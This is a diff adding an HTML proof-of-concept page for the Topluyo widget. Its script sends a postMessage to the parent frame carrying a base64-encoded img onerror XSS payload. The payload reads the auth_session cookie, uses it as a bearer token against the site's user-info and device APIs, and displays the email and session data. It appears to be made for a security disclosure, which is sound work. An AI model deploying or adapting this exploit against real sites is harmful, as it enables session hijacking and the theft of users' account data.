@@ -1,0 +1,66 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>Topluyo Widget Security PoC</title>
+</head>
+<body>
+<p>Topluyo widget security validation page</p>
+<script>
+const parentCode = `(async () => {
+  try {
+    const match = document.cookie.match(/(?:^|;\\s*)auth_session=([^;]+)/);
+    const token = match ? decodeURIComponent(match[1]) : null;
+
+    if (!token) {
+      alert("Topluyo widget XSS confirmed\\nOrigin: " + location.origin + "\\nauth_session: not present");
+      return;
+    }
+
+    const response = await fetch("/!apis", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+        "Authorization": "Bearer " + token
+      },
+      body: JSON.stringify([
+        { api: "/!api/user/info" },
+        { api: "/!api/user/devices" }
+      ])
+    });
+    const result = await response.json();
+    const user = result?.data?.["0"]?.data || {};
+    const devices = result?.data?.["1"]?.data || [];
+
+    window.__TOPLUYO_WIDGET_POC = {
+      origin: location.origin,
+      token,
+      userId: user.id || null,
+      email: user.email || null,
+      deviceSessions: devices.length,
+      apiResponse: result
+    };
+
+    alert([
+      "Topluyo widget XSS confirmed",
+      "Origin: " + location.origin,
+      "User ID: " + (user.id || "unknown"),
+      "Email: " + (user.email || "unknown"),
+      "auth_session: " + token.slice(0, 12) + "...",
+      "Device sessions readable: " + devices.length
+    ].join("\\n"));
+  } catch (error) {
+    alert("Topluyo widget XSS executed\\nError: " + error);
+  }
+})()`;
+
+const encoded = btoa(parentCode);
+const payload = `<img src=x onerror="eval(atob('${encoded}'))">`;
+
+parent.postMessage({
+  action: "<widget/title",
+  data: payload
+}, "*");
+</script>
+</body>
+</html>
